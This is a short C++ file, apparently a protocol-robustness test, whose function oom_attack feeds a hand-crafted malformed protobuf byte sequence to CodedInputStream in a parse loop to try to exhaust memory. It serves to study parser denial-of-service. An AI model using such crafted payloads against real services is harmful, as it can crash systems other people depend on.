#include "messages.pb.h"
#include <experimental/optional>
#include <easylogging++.h>

using namespace google::protobuf;
using namespace std::experimental;

namespace com::acme::protocolchaos {

    void oom_attack() {
        optional<X> x = nullopt;
        const uint8 malicious[] = {8, 1, 18, 127, 127, 127, 4, 65};
        io::CodedInputStream cis(malicious, sizeof(malicious));
        do {
            if (!x) x = X();
            x->ParsePartialFromCodedStream(&cis);
            LOG(INFO) << x->greeting().size();
        } while (!cis.ConsumedEntireMessage());
        LOG(INFO) << x->DebugString();
    }

}
